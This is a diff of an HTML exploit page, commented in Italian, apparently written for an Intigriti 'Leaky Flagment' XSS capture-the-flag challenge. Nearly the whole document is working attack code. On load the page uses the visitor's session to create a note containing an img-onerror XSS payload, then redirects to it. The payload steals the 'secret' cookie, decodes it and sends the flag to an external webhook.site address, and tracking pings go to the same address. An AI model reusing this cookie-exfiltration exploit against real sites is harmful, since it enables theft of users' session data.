@@ -1,7 +1,8 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Leaky Flagment Solution</title>
+    <title>Leaky Flagment - Exploit</title>
+    <meta charset="UTF-8">
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -13,21 +14,33 @@
             margin: 0;
             text-align: center;
         }
-        .target {
-            width: 300px;
-            height: 300px;
+        .exploit-container {
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            max-width: 500px;
+            width: 100%;
+        }
+        h1 {
+            color: #444;
+            margin-bottom: 20px;
+        }
+        .target-button {
+            width: 200px;
+            height: 200px;
             background-color: #ff4081;
             color: white;
             border-radius: 50%;
+            margin: 20px auto;
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
-            margin: 0 auto;
+            font-size: 24px;
+            font-weight: bold;
             cursor: pointer;
             animation: pulse 2s infinite;
-            font-size: 28px;
-            font-weight: bold;
+            user-select: none;
         }
         @keyframes pulse {
             0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 64, 129, 0.4); }
@@ -37,93 +50,248 @@
     </style>
 </head>
 <body>
-    <div class="target" id="target">
-        CLICCA QUI
+    <div class="exploit-container">
+        <h1>Leaky Flagment Exploit</h1>
+        <div id="targetButton" class="target-button">CLICCA QUI</div>
     </div>
 
     <script>
-        // Ottieni un ID casuale per l'exploit
+        // Configura l'exploit
+        const webhookUrl = 'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a';
         const exploitId = Math.floor(Math.random() * 1000000);
         
-        // URL del webhook
-        const webhookUrl = 'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a';
-        
-        // Payload XSS
+        // XSS payload che estrae il cookie secret e invia la flag al webhook
         const xssPayload = `<img src=x onerror="(function(){
-            // Estrae il cookie 'secret'
-            const cookie = document.cookie.split(';').find(c => c.trim().startsWith('secret='));
-            if (!cookie) return;
-            
-            // Decodifica il cookie base64
-            const secretValue = cookie.split('=')[1].trim();
-            const decodedSecret = atob(secretValue);
-            
-            // Estrae la flag (parte dopo i due punti)
-            const colonIndex = decodedSecret.indexOf(':');
-            if (colonIndex === -1) return;
-            
-            const flag = decodedSecret.substring(colonIndex + 1);
-            
-            // Invia la flag al webhook tramite immagine (aggira CORS)
-            const img = new Image();
-            img.src = '${webhookUrl}?flag=' + encodeURIComponent(flag);
-            document.body.appendChild(img);
+            try {
+                // Estrazione del cookie secret e della flag
+                const cookie = document.cookie.split(';').find(c => c.trim().startsWith('secret='));
+                if (!cookie) {
+                    console.error('Cookie non trovato');
+                    return;
+                }
+                
+                // Decodifica il cookie
+                const secretValue = cookie.split('=')[1].trim();
+                const decodedSecret = atob(secretValue);
+                console.log('Secret decodificato:', decodedSecret);
+                
+                // Estrae la flag dopo i due punti
+                const colonIndex = decodedSecret.indexOf(':');
+                if (colonIndex === -1) {
+                    console.error('Formato cookie non valido');
+                    return;
+                }
+                
+                const flag = decodedSecret.substring(colonIndex + 1);
+                console.log('Flag trovata:', flag);
+                
+                // Invia la flag al webhook (metodo immagine per aggirare CORS)
+                const img = new Image();
+                img.src = '${webhookUrl}?flag=' + encodeURIComponent(flag) + '&id=${exploitId}&time=' + Date.now();
+                document.body.appendChild(img);
+                
+                // Feedback visivo
+                const successEl = document.createElement('div');
+                successEl.style.position = 'fixed';
+                successEl.style.top = '0';
+                successEl.style.left = '0';
+                successEl.style.right = '0';
+                successEl.style.padding = '20px';
+                successEl.style.background = '#d4edda';
+                successEl.style.color = '#155724';
+                successEl.style.textAlign = 'center';
+                successEl.style.zIndex = '9999';
+                successEl.innerHTML = 'Flag inviata con successo!';
+                document.body.appendChild(successEl);
+            } catch(e) {
+                console.error('Errore durante estrazione flag:', e);
+            }
         })()">`;
         
-        // Funzione per avviare l'exploit
-        function runExploit() {
-            // Crea un documento HTML che crea la nota XSS
+        // Crea una pagina HTML di creazione nota
+        function createNoteCreationPage() {
+            // Mettiamo titolo randomico per evitare collisioni
+            const noteTitle = `Note ${exploitId}`;
+            
+            // Crea l'HTML della pagina
             const html = `
             <!DOCTYPE html>
             <html>
+            <head>
+                <title>Creazione Nota...</title>
+                <style>
+                    body {
+                        font-family: Arial, sans-serif;
+                        background: linear-gradient(to right, #ee9ca7, #ffdde1);
+                        display: flex;
+                        justify-content: center;
+                        align-items: center;
+                        height: 100vh;
+                        margin: 0;
+                        text-align: center;
+                    }
+                    .container {
+                        background: white;
+                        border-radius: 10px;
+                        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+                        padding: 30px;
+                        max-width: 500px;
+                        width: 90%;
+                    }
+                    h1 {
+                        margin-bottom: 20px;
+                    }
+                    .progress {
+                        margin: 20px 0;
+                        height: 10px;
+                        background-color: #f0f0f0;
+                        border-radius: 5px;
+                        overflow: hidden;
+                    }
+                    .progress-bar {
+                        height: 100%;
+                        background-color: #ff4081;
+                        width: 0%;
+                        transition: width 0.5s;
+                        animation: progress 3s forwards;
+                    }
+                    @keyframes progress {
+                        0% { width: 0%; }
+                        100% { width: 100%; }
+                    }
+                    .status {
+                        font-style: italic;
+                        margin-bottom: 10px;
+                    }
+                </style>
+            </head>
             <body>
-                <h1>Creazione nota...</h1>
-                <script>
-                    window.onload = function() {
-                        console.log('Creazione della nota malevola...');
+                <div class="container">
+                    <h1>Creazione nota malevola...</h1>
+                    <div class="progress">
+                        <div class="progress-bar"></div>
+                    </div>
+                    <div id="status" class="status">Inizializzazione...</div>
+                    
+                    <script>
+                        const statusEl = document.getElementById('status');
+                        const webhook = '${webhookUrl}';
+                        const exploitId = '${exploitId}';
                         
-                        fetch('https://challenge-0325.intigriti.io/api/post', {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json'
-                            },
-                            body: JSON.stringify({
-                                title: 'Note ${exploitId}',
-                                content: ${JSON.stringify(xssPayload)},
-                                use_password: 'false'
-                            }),
-                            credentials: 'include'
-                        })
-                        .then(response => response.json())
-                        .then(data => {
-                            console.log('Nota creata con ID:', data.id);
-                            // Reindirizza alla nota per attivare l'XSS
-                            window.location.href = 'https://challenge-0325.intigriti.io/note/' + data.id;
-                        })
-                        .catch(error => {
-                            console.error('Errore:', error);
-                            document.body.innerHTML += '<p>Errore: ' + error.message + '</p>';
-                        });
-                    };
-                <\/script>
+                        // Funzione per aggiornare lo stato
+                        function updateStatus(message) {
+                            statusEl.textContent = message;
+                            console.log(message);
+                        }
+                        
+                        // Funzione per inviare ping al webhook
+                        function sendPing(event, data = {}) {
+                            const img = new Image();
+                            const params = new URLSearchParams(data);
+                            img.src = webhook + '?event=' + event + '&id=' + exploitId + '&time=' + Date.now() + '&' + params.toString();
+                            document.body.appendChild(img);
+                            img.style.display = 'none';
+                        }
+                        
+                        // Funzione principale
+                        async function createNoteAndRedirect() {
+                            try {
+                                updateStatus('Creazione della nota in corso...');
+                                
+                                // Dati della nota con payload XSS
+                                const noteData = {
+                                    title: "${noteTitle}",
+                                    content: ${JSON.stringify(xssPayload)},
+                                    use_password: "false"
+                                };
+                                
+                                // Crea la nota
+                                const response = await fetch('https://challenge-0325.intigriti.io/api/post', {
+                                    method: 'POST',
+                                    headers: {
+                                        'Content-Type': 'application/json',
+                                        'Accept': '*/*'
+                                    },
+                                    body: JSON.stringify(noteData),
+                                    credentials: 'include'
+                                });
+                                
+                                if (!response.ok) {
+                                    throw new Error('Errore nella creazione della nota: ' + response.status);
+                                }
+                                
+                                // Estrai l'ID della nota dalla risposta
+                                const data = await response.json();
+                                if (!data.id) {
+                                    throw new Error('ID nota non trovato nella risposta');
+                                }
+                                
+                                const noteId = data.id;
+                                const noteUrl = 'https://challenge-0325.intigriti.io/note/' + noteId;
+                                
+                                updateStatus('Nota creata con successo! ID: ' + noteId);
+                                sendPing('note_created', { noteId });
+                                
+                                // Reindirizza alla nota per attivare l'XSS
+                                updateStatus('Reindirizzamento alla nota...');
+                                setTimeout(() => {
+                                    window.location.href = noteUrl;
+                                }, 1000);
+                            } catch (error) {
+                                updateStatus('Errore: ' + error.message);
+                                sendPing('error', { message: error.message });
+                                
+                                // Mostra l'errore nella pagina
+                                const errorEl = document.createElement('div');
+                                errorEl.style.color = 'red';
+                                errorEl.style.marginTop = '20px';
+                                errorEl.textContent = error.message;
+                                document.querySelector('.container').appendChild(errorEl);
+                            }
+                        }
+                        
+                        // Avvia la creazione della nota quando la pagina è caricata
+                        window.onload = function() {
+                            sendPing('creation_page_loaded');
+                            setTimeout(createNoteAndRedirect, 500);
+                        };
+                    </script>
+                </div>
             </body>
             </html>
             `;
             
-            // Crea un blob e un URL per il documento HTML
+            return html;
+        }
+        
+        // Avvia l'exploit
+        function runExploit() {
+            console.log('Avvio exploit...');
+            
+            // Crea una pagina HTML temporanea
+            const html = createNoteCreationPage();
             const blob = new Blob([html], { type: 'text/html' });
             const url = URL.createObjectURL(blob);
             
-            // Reindirizza al documento HTML che creerà la nota
+            // Reindirizza alla pagina di creazione nota
             window.location.href = url;
         }
         
-        // Aggiungi l'handler del click
-        document.getElementById('target').addEventListener('click', runExploit);
+        // Handler per il click sul pulsante
+        document.getElementById('targetButton').addEventListener('click', runExploit);
         
-        // Per il bot: avvia automaticamente l'exploit dopo un breve ritardo
-        // Il bot clicca sempre al centro della pagina
-        setTimeout(runExploit, 1000);
+        // Avvia automaticamente per il bot dopo un ritardo
+        window.onload = function() {
+            console.log('Pagina exploit caricata (ID: ' + exploitId + ')');
+            
+            // Ping al webhook per tracciare l'avvio
+            const img = new Image();
+            img.src = webhookUrl + '?event=exploit_loaded&id=' + exploitId + '&time=' + Date.now();
+            document.body.appendChild(img);
+            
+            // Il bot clicca al centro della pagina, quindi avviamo automaticamente
+            setTimeout(runExploit, 1000);
+        };
     </script>
 </body>
 </html>
